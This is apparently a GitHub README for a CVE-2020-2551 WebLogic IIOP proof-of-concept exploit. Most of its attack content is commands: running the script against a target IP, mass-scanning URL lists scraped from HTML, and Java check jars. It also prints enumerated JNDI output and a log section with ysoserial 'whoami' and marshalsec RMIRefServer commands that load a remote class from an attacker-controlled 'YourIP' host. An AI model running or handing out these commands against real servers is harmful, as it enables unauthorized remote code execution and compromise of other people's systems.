Twitter: [@Hktalent3135773](https://twitter.com/Hktalent3135773)
[![Tweet](https://img.shields.io/twitter/url/http/Hktalent3135773.svg?style=social)](https://twitter.com/intent/tweet?original_referer=https%3A%2F%2Fdeveloper.twitter.com%2Fen%2Fdocs%2Ftwitter-for-websites%2Ftweet-button%2Foverview&ref_src=twsrc%5Etfw&text=myhktools%20-%20Automated%20Pentest%20Recon%20Scanner%20%40Hktalent3135773&tw_p=tweetbutton&url=https%3A%2F%2Fgithub.com%2Fhktalent%2Fmyhktools)
[![Follow on Twitter](https://img.shields.io/twitter/follow/Hktalent3135773.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=Hktalent3135773)

# 0、how get pro exploit tools?
see https://github.com/hktalent/CVE-2020-2551/issues/5

# 1、CVE-2020-2551
CVE-2020-2551 poc exploit python example
keys:
GIOP corba
<img width="588" alt="image" src="https://user-images.githubusercontent.com/18223385/75644021-da372000-5c7b-11ea-8176-b6f911dd4f13.png">


### How use
```
python3 CVE-2020-2551.py -u http://192.168.26.79:7001
cat urls.txt|sort -u|xargs -I % python3 CVE-2020-2551.py -u %
cat xxx.html|grep -Eo 'http[s]?:\/\/[^ \/]+'|sort -u|xargs -I % python3 CVE-2020-2551.py -u %
# 32 Thread check
cat allXXurl.txt|grep -Eo 'http[s]?:\/\/[^ \/]+'|sort -u|python3 CVE-2020-2551.py -e
# now result to data/*.txt
java -cp hktalent_51pwn_com_12.1.3.0_check.jar testiiop.ExpCVE20202551_names ip:port ip:port
java -cp hktalent_51pwn_com_12.2.1.3.0_check.jar testiiop.ExpCVE20202551_names ip:port ip:port
```

### t3, t3s, http, https, iiop, iiops
```
service:jmx:rmi://ip:port/jndi/iiop://ip:port/MBean-server-JNDI-name
service:jmx:iiop://ip:port/jndi/weblogic.management.mbeanservers.domainruntime
service:jmx:t3://ip:port/jndi/weblogic.management.mbeanservers.domainruntime
```

## poc
<img width="695" alt="image" src="https://user-images.githubusercontent.com/18223385/75640403-f0d77a00-5c6f-11ea-92f5-61a6840b8bf3.png">



# 2、your know your do
```
{
    "ejb": {
        "class": "com.sun.jndi.cosnaming.CNCtx",
        "interfaces": [
            "javax.naming.Context"
        ],
        "mgmt": {
            "MEJB": {
                "class": "com.sun.corba.se.impl.corba.CORBAObjectImpl",
                "interfaces": []
            },
            "class": "com.sun.jndi.cosnaming.CNCtx",
            "interfaces": [
                "javax.naming.Context"
            ]
        }
    },
    "javax": {
        "class": "com.sun.jndi.cosnaming.CNCtx",
        "error msg": "org.omg.CORBA.NO_PERMISSION:   vmcid: 0x0  minor code: 0  completed: No",
        "interfaces": [
            "javax.naming.Context"
        ]
    },
    "jdbc": {
        "class": "com.sun.jndi.cosnaming.CNCtx",
        "db_xf": {
            "class": "com.sun.corba.se.impl.corba.CORBAObjectImpl",
            "interfaces": []
        },
        "interfaces": [
            "javax.naming.Context"
        ]
    },
    "mejbmejb_jarMejb_EO": {
        "class": "com.sun.corba.se.impl.corba.CORBAObjectImpl",
        "interfaces": []
    },
    "weblogic": {
        "class": "com.sun.jndi.cosnaming.CNCtx",
        "error msg": "org.omg.CORBA.NO_PERMISSION:   vmcid: 0x0  minor code: 0  completed: No",
        "interfaces": [
            "javax.naming.Context"
        ]
    }
}
```

# 3、ejb
```
/bea_wls_internal/classes/mejb@/

weblogic.management.j2ee.mejb.Mejb_dj*#remove(Object obj)
```

# 4、jta
```
x.lookup("ejb/mgmt/MEJB").remove(jta);
```
# 5、logs
- fix rmi use Jdk7u21 payload，not work for remote jdk8
don‘t use
```
java -cp $mtx/../tools/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'whoami'
```
use,XXclass.class from jdk6 build
```
java -cp $mtx/../tools/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer 'http://YourIP:port/#XXclass' 1099
```

# 6、thanks for
@[r4v3zn](https://github.com/r4v3zn)
@[0nise](https://github.com/0nise)
[![Top Langs](https://profile-counter.glitch.me/hktalent/count.svg)](https://51pwn.com)
